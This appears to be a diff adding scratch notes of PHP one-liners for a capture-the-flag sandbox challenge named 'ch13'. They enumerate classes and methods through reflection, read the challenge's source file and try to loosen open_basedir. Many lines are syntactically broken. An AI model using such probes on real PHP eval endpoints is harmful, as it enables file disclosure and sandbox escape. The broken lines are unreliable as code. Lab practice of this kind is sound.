@@ -1,0 +1,25 @@
+print_r(get_declared_classes())
+
+print_r(get_class_vars(get_declared_classes()[107]))
+print_r(get_class_methods(get_declared_classes()[77]))
+print_r(call_user_method(get_class_methods(get_declared_classes()[128])[1]))
+
+print_r(get_class_methods(get_declared_classes()[42])[2]('ch13.php'))
+
+get_class_methods(get_declared_classes()[77])->getBasename
+
+print_r(get_class_methods(get_declared_classes()[77])[32]->getName())
+
+
+print_r(get_class_methods(get_declared_classes()[128]))
+
+print_r(get_class_methods(get_declared_classes()[42])))
+highlight_source(ch13.php);
+print_r(implode(hi, [ , ]));
+print_r(file_get_contents("/challenge/app-script/ch13/ch13.php");
+
+<?php ini_set("open_basedir", "."); ?>
+
+ini_set("open_basedir", "../");
+
+var_dump(file_get_contents(/challenge/app-script/ch13/ch13.php));
